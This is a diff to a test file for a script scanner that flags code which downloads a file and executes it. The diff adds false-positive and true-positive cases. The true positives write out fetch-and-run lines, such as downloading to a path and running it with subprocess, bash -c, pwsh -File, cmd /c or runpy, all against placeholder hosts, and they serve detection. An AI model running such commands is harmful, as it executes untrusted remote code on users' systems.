@@ -919,6 +919,16 @@ def test_no_budget_note_when_all_checked(home):
     ("a.js", 'execSync("curl -o data.json https://x/d")\nconst d = require("./data.json")\n'),
     ("a.ts", "await exec('curl -o cfg.yml https://x/c')\nparse(read('cfg.yml'))\n"),
     ("a.ps1", 'iwr https://x/a.zip -OutFile a.zip\nExpand-Archive("a.zip")\n'),
+    # QA N4: an exec call that names the file but runs another program.
+    ("a.py", 'urlretrieve("https://x/t.tgz", "t.tgz")\nos.system("tar xzf t.tgz")\n'),
+    ("a.py", 'urlretrieve("https://x/a.zip", "a.zip")\nsubprocess.run(["unzip", "a.zip"])\n'),
+    ("a.py", 'urlretrieve("https://x/r.txt", "r.txt")\n'
+             'subprocess.run(["pip","install","-r","r.txt"])\n'),
+    ("a.js", 'execSync("curl -o d.json https://x")\nexecSync("jq . d.json")\n'),
+    ("a.py", 'urlretrieve(u, "p.whl")\nsubprocess.run(["python", "-m", "pip", "install", '
+             '"p.whl"])\n'),
+    ("a.py", 'urlretrieve(u, "d.csv")\nsubprocess.run(["sh", "-c", "wc -l d.csv"])\n'),
+    ("a.bat", "curl -o notes.txt https://x/n\ntype notes.txt\n"),
 ])
 def test_code_run_false_positives(home, name, text):
     assert script_kinds(home, name, text) == []
@@ -935,6 +945,16 @@ def test_code_run_false_positives(home, name, text):
     ("i.ps1", "iwr https://x/i.ps1 -OutFile i.ps1\n& .\\i.ps1\n"),
     ("i.ps1", "Invoke-WebRequest https://x/s.exe -OutFile s.exe; Start-Process s.exe\n"),
     ("noext", "#!/usr/bin/env python3\nurlretrieve(u, 'x.sh')\nsubprocess.call(['sh', 'x.sh'])\n"),
+    # QA N4: the file is the program, follows an interpreter, or a -c / /c string runs it.
+    ("i.py", 'urlretrieve(u, "/tmp/t")\nsubprocess.run(["/tmp/t", "--quiet"])\n'),
+    ("i.py", 'urlretrieve(u, "s.py")\nsubprocess.run(["python3", "-u", "s.py"])\n'),
+    ("i.py", 'urlretrieve(u, "t")\nsubprocess.run(["bash", "-c", "chmod +x t; ./t"])\n'),
+    ("i.py", 'urlretrieve(u, "i.ps1")\nsubprocess.run(["pwsh", "-File", "i.ps1"])\n'),
+    ("i.py", 'urlretrieve(u, "i.bat")\nsubprocess.run(["cmd", "/c", "i.bat"])\n'),
+    ("i.py", 'urlretrieve(u, "/tmp/p.py")\nrunpy.run_path("/tmp/p.py")\n'),
+    ("i.js", "execSync('curl -o x https://x/x')\nexecSync('sh x')\n"),
+    ("i.bat", "curl -o setup.cmd https://x/s\ncall setup.cmd\n"),
+    ("i.cmd", "curl -o s.bat https://x/s\ncmd /c s.bat\n"),
 ])
 def test_code_run_true_positives(home, name, text):
     assert ("download_exec", "high") in script_kinds(home, name, text)
